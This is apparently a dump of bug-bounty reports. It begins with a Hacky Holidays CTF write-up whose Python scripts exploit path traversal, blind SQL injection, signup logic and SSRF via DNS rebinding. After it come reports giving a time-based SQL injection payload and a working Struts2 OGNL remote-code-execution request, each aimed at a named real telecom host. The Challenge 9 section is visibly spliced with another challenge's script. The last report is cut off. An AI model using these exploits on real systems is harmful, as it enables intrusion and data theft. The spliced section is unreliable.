3import base64
4import json
5
6if __name__ == "__main__":
7    print("[*] Challenge 4")
8    url = "https://hackyholidays.h1ctf.com/swag-shop/api/sessions"
9    r = requests.get(url)
10    j = r.json()
11    for el in j["sessions"]:
12        elencode = el.encode("utf-8")
13        b64 = base64.b64decode(elencode)
14        d = b64.decode("utf-8")
15        j = json.loads(d)
16        c = j['user']
17        if(c is not None):
18            url = "https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid={}".format(c)
19            r = requests.get(url)
20            j = json.loads(r.text)
21            print("[*] Flag: {}".format(j["flag"]))
22            break
Challenge 5
The fifth challenge was accessible by browsing https://hackyholidays.h1ctf.com/secure-login. The challenge webpage contained a login form requesting a username and password.
<image_18>
The first thing I noticed here was that a specific error message was returned when logging in with an invalid username.
<image_19>
This was a strong sign of the possibility to perform username enumeration. Again I used a custom wordlist, Burp Intruder and the "Grep - Extract" feature to bruteforce the right username.
<image_20>
The right username resulted in "access". The same process was repeated to bruteforce the password (with another custom wordlist), after having set the username POST parameter to "access".
<image_21>
I found out that the password was "computer"
After having logged in, the web server returned an error message stating: "No Files to Download". Rabbit hole here we go! However, the session cookie set up after the login was interesting.
<image_22>
Decoding the cookie from base64, I got the following value
{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}
What about turning that "admin" JSON property from false to true.
<image_23>
The initial cookie base64 was then replaced with the one obtained, and the content of the admin panel changed.
<image_24>
However, the .zip file required a password to be open. A simple zip bruteforce with the rockyou.txt wordlist allowed to retrieve the right password: hahahaha
The ZIP file contained a grinch image and a txt file containing the flag.
<image_25>
Flag: flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
Challenge 6
The sixth challenge was accessible by browsing https://hackyholidays.h1ctf.com/my-diary/. The challenge contained some diary entries in a calendar format.
<image_26>
The values were imported from the entries.html file through the template GET parameter, as shown in the previous image. The parameter was a strong indicator of a possible path traversal vulnerability to read further files from the webserver filesystem. Trying with some arbitrary value for the template parameter, a redirect was performed on the original challenge webpage.
<image_27>
Another thing I thought was to read the sourcecode of known files (such as the index.php file). In that case, the read was successful.
<image_28>
Following the sourcecode of the index.php file, together with a short explanation of what it did.
Code 689 Bytes
1<?php
2if( isset($_GET["template"])  ){
3    $page = $_GET["template"];
4    //remove non allowed characters
5    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
6    //protect admin.php from being read
7    $page = str_replace("admin.php","",$page);
8    //I've changed the admin file to secretadmin.php for more security!
9    $page = str_replace("secretadmin.php","",$page);
10    //check file exists
11    if( file_exists($page) ){
12       echo file_get_contents($page);
13    }else{
14        //redirect to home
15        header("Location: /my-diary/?template=entries.html");
16        exit();
17    }
18}else{
19    //redirect to home
20    header("Location: /my-diary/?template=entries.html");
21    exit();
22}
The "template" GET parameter was assigned to the page variable. Afterwards, a regex was performed on that variable to remove any character that was not alphanumeric or the dot, plus any occurences of "admin.php" and "secretadmin.php" were removed. Finally, the content of the file passed in the page variable was read. The first interesting thing in this code was the possibility to read files from the web server current folder. The second thing was this comment, which exposed the name of the admin file "secretadmin.php".
//I've changed the admin file to secretadmin.php for more security!
After some trial and error I managed to find a bypass for the checks performed in the code with the following payload.
secretadmsecretadadmin.phpmin.phpin.php
The first check is passed as the string contains only alphanumeric characters and dots
The second check transform the string in:
secretadmsecretadmin.phpin.php
secretadmsecretadmin.phpin.php
The third check transform the string in:
secretadmin.php
secretadmin.php
<image_29>
The content of the secretadmin.php file is read and the flag is returned inside the webpage.
Flag: flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
The following Python script exploits the vulnerability and retrieve the flag:
Code 553 Bytes
1#!/usr/bin/python3
2import requests
3import re
4
5if __name__ == "__main__":
6    print("[*] Challenge 6")
7    url = "https://hackyholidays.h1ctf.com/my-diary/?template=index.php"
8    r = requests.get(url)
9    print("="*30)
10    print("index.php source")
11    print("="*30)
12    print(r.text)
13    print("="*30)
14    payload = "secretadmsecretadadmin.phpmin.phpin.php"
15    url = "https://hackyholidays.h1ctf.com/my-diary/? template={}".format(payload)
16    r = requests.get(url)
17    r1 = re.findall(r"flag\{[\w-]+\}",r.text)
18    print("[*] Flag: {}".format(r1[0]))
Challenge 7
The seventh challenge was accessible by browsing https://hackyholidays.h1ctf.com/hate-mail-generator. The challenge contained email campaigns and a section to create new ones.
<image_30>
Clicking on the only available email campaigns brought me on https://hackyholidays.h1ctf.com/hate-mail-generator/91d45040151b681549d82d8065d43030
<image_31>
This seemed like a template injection vulnerability. Also, from the existing campaign it is possible to notice that templates are imported using {{template:PAYLOAD}}. The following endpoint allowed to preview new campaigns (creation was disabled as credits were required).
https://hackyholidays.h1ctf.com/hate-mail-generator/new
<image_32>
Some I knew some templates were already used in one of the campaign, I performed a directory bruteforce with a custom wordlist to find possible interesting folders. I discovered that the /templates directory was accessible and listable.
<image_33>
This directory contained another template file, 38dhs_admins_only_header.html, which was not directly accessible. However, I used the {{template:PAYLOAD}} statement to load this template in the preview of new campaign. The following request was made:
Code 254 Bytes
1POST /hate-mail-generator/new/preview HTTP/1.1 
2Host: hackyholidays.h1ctf.com 
3Content-Type: application/x-www-form-urlencoded 
4Content-Length: 105 
5preview_markup={{name}}&preview_data={"name":"{{template:38dhs_admins_only_header.html}}","email":"test"}
<image_34>
Flag: flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}
Challenge 8
The eight challenge was accessible by browsing https://hackyholidays.h1ctf.com/forum. The challenge contained some forum threads and a login panel.
<image_35>
This was an OSINT challenge, but I spent a lot of time finding where to start. I discovered that the challenges were created by Adam Tlangley, therefore I inspected his Github profile https://github.com/adamtlangley.
<image_36>
This contained a commit to the repository Grinch-Network/forum (similar name to the challenge).
As it is usually done in similar challenges, I inspected the previous commits to identify significant differences. It turned out that some credentials where removed from a .php file here https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae
<image_37>
forum:6HgeAZ0qC9T6CQIqJpD
They were some sort of database credentials but initially I did not have any idea about where to use them.
Later I performed a directory bruteforce on the /forum endpoints using Burp "Content-Discovery". I discovered that an instance of phpmyadmin was accessible on the /forum endpoint, and that the previous credentials allowed to retrieve data from the database.
<image_38>
From the database, it was possible to dump two hashed credentials. One belonged to an admin user.
grinch 35D652126CA1706B59DB02C93E0C9FBF // Admin
max 388E015BC43980947FCE0E5DB16481D1
The passwords appeared to be hashed in md5. I used this site https://www.md5online.org/md5-decrypt.html to perform a bruteforce of the hash and retrieve the original password: BahHumbug.
<image_39>
The found credential (grinchBahHumbug) was used to log in into the forum login panel.
<image_40>
The new "Secret Plans" section contained a thread with the flag.
<image_41>
Flag: flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
Challenge 9
The ninth challenge was accessible by browsing https://hackyholidays.h1ctf.com/evil-quiz. The challenge contained some quiz questions and a final tab showing the obtained score. There was also an admin login panel which required a username and password.
From this challenge on things got interesting and evil! 
<image_42>
The suspicious thing in this challenge was the statement on the "Score" tab, reporting "There is DD other player(s) with the same name as you!".
<image_43>
<image_44>
Code 1.57 KiB
1#!/usr/bin/python3
2
3import requests, time, urllib3
4import re
5from bs4 import BeautifulSoup
6
7if __name__ == "__main__": 
8    print("[*] Challenge 11 - Identify endpoints")
9    with open("api_object_lowercase.txt") as f:
10        for endpoint in f:
11            session = requests.session()
12            x = endpoint.rstrip()
13            burp0_url = "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=b%27%20UNION%20ALL%20SELECT%20%221%27%20UNION%20ALL%20SELECT%20%27c%27,%27b%27,%27../api/{}%27--%20-%22,1,2--%20-".format(x)
14            burp0_headers = {"Connection": "close", "Content-Type":"application/json","Cache-Control": "max-age=0", "sec-ch-ua": "\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"", "sec-ch-ua-mobile": "?0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "Accept": "*/*", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9,it-IT;q=0.8,it;q=0.7,zh-CN;q=0.6,zh;q=0.5"}
15            r = session.get(burp0_url, headers=burp0_headers)
16            soup = BeautifulSoup(r.text)
17            l = soup.find_all("img", {"class": "img-responsive"})
18            p = l[2]["src"]
19            burp0_url = "https://hackyholidays.h1ctf.com{}".format(p)
20            r = session.get(burp0_url, headers=burp0_headers)
21            if "Expected" not in r.text:
22                print("/{} is available".format(x))
admin:S3creT_p4ssw0rd-$
Finally, I used the found credentials to login into the admin panel. The resulting webpage contained the flag.
<image_45>
Flag: flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
Challenge 10
The tenth challenge was accessible by browsing https://hackyholidays.h1ctf.com/signup-manager/. The challenge contained a signup and a login form in its main webpage.
<image_46>
A first dir bruteforce on signup-manager/ revealed the following interesting ZIP file.
https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip
<image_47>
The ZIP file contained the source code of the application.
<image_48>
Of all the previous files, the interesting code was inside index.php
Code 4.07 KiB
1<?php
2if( isset($_GET["logout"]) ){
3    setcookie('token',null,time()-3600);
4    header("Location: ".explode("?",$_SERVER["REQUEST_URI"])[0]);
5    exit();
6}
7function buildUsers(){
8    $users = array();
9    $users_txt = file_get_contents('users.txt');
10    foreach( explode(PHP_EOL,$users_txt) as $user_str ){
11        if( strlen($user_str) == 113 ) {
12            $username = str_replace('#', '', substr($user_str, 0, 15));
13            $users[$username] = array(
14                'username' => $username,
15                'password' => str_replace('#', '', substr($user_str, 15, 32)),
16                'cookie' => str_replace('#', '', substr($user_str, 47, 32)),
17                'age' => intval(str_replace('#', '', substr($user_str, 79, 3))),
18                'firstname' => str_replace('#', '', substr($user_str, 82, 15)),
19                'lastname' => str_replace('#', '', substr($user_str, 97, 15)),
20                'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)
21            );
22        }
23    }
24    return $users;
25}
26function addUser($username,$password,$age,$firstname,$lastname){
27    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
28    $line = '';
29    $line .= str_pad( $username,15,"#");
30    $line .= $password;
31    $line .= $random_hash;
32    $line .= str_pad( $age,3,"#");
33    $line .= str_pad( $firstname,15,"#");
34    $line .= str_pad( $lastname,15,"#");
35    $line .= 'N';
36    $line = substr($line,0,113);
37    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
38    return $random_hash;
39}
40$all_users = buildUsers();
41$page = 'signup.php';
42if( isset($_COOKIE["token"]) ){
43    foreach( $all_users as $u ){
44        if( $u["cookie"] === $_COOKIE["token"] ){
45            if( $u["admin"] ){
46                $page = 'admin.php';
47            }else{
48                $page = 'user.php';
49            }
50        }
51    }
52}
53if( $page == 'signup.php' ) {
54    $errors = array();
55    if (isset($_POST["action"])) {
56        if( $_POST["action"] == 'login' && isset($_POST["username"], $_POST["password"]) ){
57            if( isset($all_users[ $_POST["username"] ]) ){
58                $u = $all_users[ $_POST["username"] ];
59                if( md5($_POST["password"]) === $u["password"] ){
60                    setcookie('token', $u["cookie"], time() + 3600);
61                    header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
62                    exit();
63                }
64            }
65            $errors[] = 'Username and password combination not found';
66        }
67        if ($_POST["action"] == 'signup' && isset($_POST["username"], $_POST["password"], $_POST["age"], $_POST["firstname"], $_POST["lastname"])) {
68            $username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
69            if (strlen($username) < 3) {
70                $errors[] = 'Username must by at least 3 characters';
71            } else {
72                if (isset($all_users[$username])) {
73                    $errors[] = 'Username already exists';
74                }
75            }
76            $password = md5($_POST["password"]);
77            $firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
78            if (strlen($firstname) < 3) {
79                $errors[] = 'First name must by at least 3 characters';
80            }
81            $lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
82            if (strlen($lastname) < 3) {
83                $errors[] = 'Last name must by at least 3 characters';
84            }
85            if (!is_numeric($_POST["age"])) {
86                $errors[] = 'Age entered is invalid';
87            }
88            if (strlen($_POST["age"]) > 3) {
89                $errors[] = 'Age entered is too long';
90            }
91            $age = intval($_POST["age"]);
92            if (count($errors) === 0) {
93                $cookie = addUser($username, $password, $age, $firstname, $lastname);
94                setcookie('token', $cookie, time() + 3600);
95                header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
96                exit();
97            }
98        }
99    }
100}
101include_once($page);
When performing a new sign up, the code checked for some constraint on the POST parameters and returned an error in case they were not respected. Furthermore, if all the constraints were satisfied the PHP file created a new user inside the users.txt file. To create an admin user, it was necessary to have an "Y" as last character in the relative user text file line. Therefore, if it was possible to bypass one of the performed check and add more characters, it would have been possible to tamper the application logic and create a new user line with the "Y" character at the end.  The vulnerable check resulted in the following one.
Code 209 Bytes
1if (!is_numeric($_POST["age"])) {
2                $errors[] = 'Age entered is invalid';
3}
4if (strlen($_POST["age"]) > 3) {
5                $errors[] = 'Age entered is too long';
6}
7$age = intval($_POST["age"]);
In this case, the previous lines turned a value like 1e5 (of exactly three characters) into 100000.  Therefore, when a new user was added, it was possible to play with the firstname and lastname POST parameters to insert some Y at the end.  The line would have then been stripped to 113 characters with the last statement.
Code 148 Bytes
1$line .= str_pad( $age,3,"#");
2$line .= str_pad( $firstname,15,"#");
3$line .= str_pad( $lastname,15,"#");
4$line .= 'N';
5$line = substr($line,0,113);
A working HTTP payload was the following:
Code 1015 Bytes
1POST /signup-manager/ HTTP/1.1 
2Host: hackyholidays.h1ctf.com 
3Connection: close 
4Content-Length: 122 
5Cache-Control: max-age=0 
6sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87" 
7sec-ch-ua-mobile: ?0 
8Upgrade-Insecure-Requests: 1 
9Origin: https://hackyholidays.h1ctf.com 
10Content-Type: application/x-www-form-urlencoded 
11User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 
12Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 
13Sec-Fetch-Site: same-origin 
14Sec-Fetch-Mode: navigate 
15Sec-Fetch-User: ?1 
16Sec-Fetch-Dest: document 
17Referer: https://hackyholidays.h1ctf.com/signup-manager/ 
18Accept-Encoding: gzip, deflate 
19Accept-Language: en-US,en;q=0.9,it-IT;q=0.8,it;q=0.7,zh-CN;q=0.6,zh;q=0.5 
20
21action=signup&username=BYYYYYYYYYYYYYY&password=BYYYYYYYYYYYYYY&age=1e5&firstname=AYYYYYYYYYYYYYY&lastname=AYYYYYYYYYYYYYY
This created a new admin user having username and password equals to BYYYYYYYYYYYYYY.
Accessing the login panel using those credentials returned the flag and a link to the next challenge.
<image_49>
Flag: flag{99309f0f-1752-44a5-af1e-a03e4150757d}
Challenge 11 (Welcome to the inception dream)
Challenge 11 was accessible by browsing https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59. The challenge contained a list of albums with some pics and a login form. This challenge was very hard and required multiple steps to be fully exploited.
<image_50>
1 - Initial recon
An initial recon on the r3c0n_server_4fdk59/ endpoint with Burp "Content Discovery" allowed me to discover the /api endpoint.
<image_51>
However, the webserver returned the following error message when trying to access to an API.
Code 64 Bytes
1{"error":"This endpoint cannot be visited from this IP address"}
2 - SQL Injection hash parameter
The hash parameter in https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash= was vulnerable to a Blind AND SQL Injection vulnerability. The following test confirms the vulnerability:
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k%27%20AND%204127=4127%20AND%20%27hIVa%27=%27hIVa
<image_52>
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k%27%20AND%204127=4127%20AND%20%27hIVa%27=%27test
<image_53>
Also, a UNION payload is feasible to exploit the vulnerability
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-8783%27%20UNION%20ALL%20SELECT%20NULL,NULL,database()--%20-
<image_54>
However dumping the data with SQLMAP did not return anything useful
<image_55>
3 - SQL Injection Inception
Finally, I discovered that in order to successfully call the API, it was necessary to forge an appropriate request directly from the webserver. The images available on the web application were generated from the webserver using a secret hash.
<image_56>
By tampering the image parameter with a custom endpoint, the following error message was returned by the webserver.
<image_57>
What I discovered was that it was possible to exploit the image generation process and the SQL Injection to craft valid hashes for an arbitrary endpoint.
The following payload demonstrates the scenario, which create a valid hash and provides a link for the /api endpoint.
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=b%27%20UNION%20ALL%20SELECT%20%221%27%20UNION%20ALL%20SELECT%20%27c%27,%27b%27,%27api%27--%20-%22,1,2--%20-
Which results in the following response from the webserver.
<image_58>
4 - API bruteforce
I understood that the /api endpoint was in the parent directory, so I tried with the ../api value.
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=b%27%20UNION%20ALL%20SELECT%20%221%27%20UNION%20ALL%20SELECT%20%27c%27,%27b%27,%27../api%27--%20-%22,1,2--%20-
<image_59>
This means that the /api endpoint was successfully reached, but the content-type is not valid. I created a script to discover additional endpoints by bruteforcing the /api folder.
Code 1.57 KiB
1#!/usr/bin/python3
2
3import requests, time, urllib3
4import re
5from bs4 import BeautifulSoup
6
7if __name__ == "__main__": 
8    print("[*] Challenge 11 - Identify endpoints")
9    with open("api_object_lowercase.txt") as f:
10        for endpoint in f:
11            session = requests.session()
12            x = endpoint.rstrip()
13            burp0_url = "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=b%27%20UNION%20ALL%20SELECT%20%221%27%20UNION%20ALL%20SELECT%20%27c%27,%27b%27,%27../api/{}%27--%20-%22,1,2--%20-".format(x)
14            burp0_headers = {"Connection": "close", "Content-Type":"application/json","Cache-Control": "max-age=0", "sec-ch-ua": "\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"", "sec-ch-ua-mobile": "?0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "Accept": "*/*", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9,it-IT;q=0.8,it;q=0.7,zh-CN;q=0.6,zh;q=0.5"}
15            r = session.get(burp0_url, headers=burp0_headers)
16            soup = BeautifulSoup(r.text)
17            l = soup.find_all("img", {"class": "img-responsive"})
18            p = l[2]["src"]
19            burp0_url = "https://hackyholidays.h1ctf.com{}".format(p)
20            r = session.get(burp0_url, headers=burp0_headers)
21            if "Expected" not in r.text:
22                print("/{} is available".format(x))
5 - Credentials wildcard bruteforce
I found out that the /user endpoint was accessible using that method. Then I tried to find some GET parameters to pass to the URL in order to retrieve credentials using the /user API. I noticed that the "username" GET parameter allowed to perform queries, and furthermore it was possible to perform a bruteforce on the username by using the "%" wildcard character and a comparison of the response to check the right character. The following script performs this scenario to retrieve the username.
Code 1.75 KiB
1#!/usr/bin/python3
2
3import requests, time
4import re
5from bs4 import BeautifulSoup
6
7if __name__ == "__main__": 
8    letters = "abcdefghijklmnopqrstuvwxyz1234567890_-$"
9    username = ""
10    found = False
11    for l in range(1,40):
12        found = False
13        for o in letters:
14            session = requests.session()
15            burp0_url = "https://hackyholidays.h1ctf.com:443/r3c0n_server_4fdk59/album?hash=b%27%20UNION%20ALL%20SELECT%20%221%27%20UNION%20ALL%20SELECT%20%27c%27,%27b%27,%27../api/user?username={}%25%27--%20-%22,%22%22,%22NO!%22--%20-".format(username+o)
16            burp0_headers = {"Connection": "close", "Content-Type":"application/json","Cache-Control": "max-age=0", "sec-ch-ua": "\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"", "sec-ch-ua-mobile": "?0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "Accept": "*/*", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9,it-IT;q=0.8,it;q=0.7,zh-CN;q=0.6,zh;q=0.5"}
17            r = session.get(burp0_url, headers=burp0_headers)
18            soup = BeautifulSoup(r.text)
19            l = soup.find_all("img", {"class": "img-responsive"})
20            p = l[2]["src"]
21            burp0_url = "https://hackyholidays.h1ctf.com{}".format(p)
22            r = session.get(burp0_url, headers=burp0_headers)
23            if "Expected" not in r.text:
24                username = username + o
25                print("Username till now {}".format(username))
26                found = True
27                break
28        if found is False:
29            break
After having retrieved the username, I used the same process to retrieve the password using the GET password parameter. Following the script to retrieve the password.
Code 1.75 KiB
1#!/usr/bin/python3
2
3import requests, time
4import re
5from bs4 import BeautifulSoup
6
7if __name__ == "__main__": 
8    letters = "abcdefghijklmnopqrstuvwxyz1234567890_-$"
9    password = ""
10    found = False
11    for l in range(1,40):
12        found = False
13        for o in letters:
14            session = requests.session()
15            burp0_url = "https://hackyholidays.h1ctf.com:443/r3c0n_server_4fdk59/album?hash=b%27%20UNION%20ALL%20SELECT%20%221%27%20UNION%20ALL%20SELECT%20%27c%27,%27b%27,%27../api/user?password={}%25%27--%20-%22,%22%22,%22NO!%22--%20-".format(password+o)
16            burp0_headers = {"Connection": "close", "Content-Type":"application/json","Cache-Control": "max-age=0", "sec-ch-ua": "\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"", "sec-ch-ua-mobile": "?0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "Accept": "*/*", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9,it-IT;q=0.8,it;q=0.7,zh-CN;q=0.6,zh;q=0.5"}
17            r = session.get(burp0_url, headers=burp0_headers)
18            soup = BeautifulSoup(r.text)
19            l = soup.find_all("img", {"class": "img-responsive"})
20            p = l[2]["src"]
21            burp0_url = "https://hackyholidays.h1ctf.com{}".format(p)
22            r = session.get(burp0_url, headers=burp0_headers)
23            if "Expected" not in r.text:
24                password = password + o
25                print("Password till now {}".format(password))
26                found = True
27                break
28        if found is False:
29            break
The process resulted in the following credentials:
grinchadmin / s4nt4sucks
Then, I used those credentials to login into the "Attack Box", where the flag was stored.
<image_60>
Flag: flag{07a03135-9778-4dee-a83c-7ec330728e72}
Challenge 12
Challenge 12 was accessible by browsing https://hackyholidays.h1ctf.com/attack-box. The challenge contained some IPs to attack clicking on a button.
<image_61>
Clicking on one of the attack buttons performed a request similar to the following.
Code 150 Bytes
1https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
The base64 payload contained the following value:
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
By trying to tamper the target value, the webserver returned the following error.
<image_62>
It was necessary to bruteforce the hash order to generate new md5 hashes and arbitrary target properties. I used hashcat and the rockyou.txt wordlist for this purpose. Hashcat mode 10 was used, namely md5($pass.$salt). The bruteforce was successful and the secret value resulted to be: mrgrinch463. Afterwards, I created a script to generate new hashes and start attacks with arbitrary target values.
Code 1.64 KiB
1import hashlib,requests,base64,json
2import urllib.parse
3import webbrowser
4import time
5
6if __name__ == "__main__":
7	while True:
8		ip = "470631266f2a4f108432eff944f33ed6.gel0.space"
9		bytes1 = str.encode("mrgrinch463{}".format(ip))
10		hash1 = hashlib.md5(bytes1).hexdigest()
11		print("[*] Hash is {}".format(hash1))
12		payload = {"target":ip,"hash":hash1}
13		payload_str = json.dumps(payload)
14		payload1 = base64.b64encode(str.encode(payload_str))
15		print(payload1)
16		payload1_1 = {'payload':payload1}
17		payload2 = urllib.parse.urlencode(payload1_1,safe=':+') 
18		burp0_url = "https://hackyholidays.h1ctf.com:443/attack-box/launch"
19		burp0_cookies = {"attackbox": "d09d508e78f3975e0199a5e91dde9687"}
20		burp0_headers = {"Connection": "close", "sec-ch-ua": "\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"", "sec-ch-ua-mobile": "?0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://hackyholidays.h1ctf.com/attack-box", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9,it-IT;q=0.8,it;q=0.7,zh-CN;q=0.6,zh;q=0.5"}
21		r = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,params=payload2,allow_redirects=False)
22		url = r.headers['Location']
23		webbrowser.open_new("https://hackyholidays.h1ctf.com"+url)
24		time.sleep(15)
However, when trying to put loopback values as target value, the server returned an error message.
<image_63>
I tried with some bypass (already common for SSRF attacks) but they were not successful. Afterwards, I tried to perform a DNS Rebinding attack to bypass the local IP address check, by putting the 470631266f2a4f108432eff944f33ed6.gel0.space hostname inside the script.
The webserver redirected me on the final competition webpage containing the flag.
<image_64>
flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}
Impact
N/A



==================================================

Report File: 1069531.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- SQL Injection

Contents:

hello dear support
I have found Blind SQL Injection on https://futexpert.mtngbissau.com/signin/
parameters injectable phone_number=0&pin=1&submit=Continuar via post
URL:https://futexpert.mtngbissau.com/signin/
Post: email=0
my payload : phone_number=0'XOR(if(now()=sysdate()%2Csleep(0)%2C0))XOR'Z&pin=1&submit=Continuar
HTTP request
Code 725 Bytes
1POST /signin/ HTTP/1.1
2Host: futexpert.mtngbissau.com
3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Content-Type: application/x-www-form-urlencoded
8Content-Length: 116
9Origin: https://futexpert.mtngbissau.com
10Connection: close
11Referer: https://futexpert.mtngbissau.com/signin/
12Cookie: _ga=GA1.2.807090149.1609258213; _gid=GA1.2.432006610.1609466934; PHPSESSID=87pejs8h0usb0ill37hit63an5
13Upgrade-Insecure-Requests: 1
14
15phone_number=0%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%2812%29%2C0%29%29XOR%27Z+%3D%3E&pin=1&submit=Continuar
16
if you need more info I'm here thank you
Impact
An attacker can use SQL injection it to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database. SQLi can also be used to add, modify and delete records in a database, affecting data integrity. Under the right circumstances, SQLi can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.



==================================================

Report File: 1070532.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Code Injection

Contents:

Summary:
A Remote Code Execution vulnerability exists in Apache Struts2 when performing file upload based on Jakarta Multipart parser. It is possible to perform a RCE attack with a malicious Content-Type value. If the Content-Type value isn't valid an exception is thrown which is then used to display an error message to a user.
Steps To Reproduce:
POC
GET /pwsc/login.do HTTP/1.1 Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(31337*31337)).(#ros.flush())} Cookie: ROUTEID=.1;JSESSIONID=13E16D2D032451B88B408F0CED57407E.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: wifi-partner.mtn.com.gh User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36 Connection: Keep-alive
<image_0>
you can see how I performed the mathematical formula and printed it in the answer
Impact
rce



==================================================

Report File: 1072277.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Business Logic Errors

Contents:

Hello team
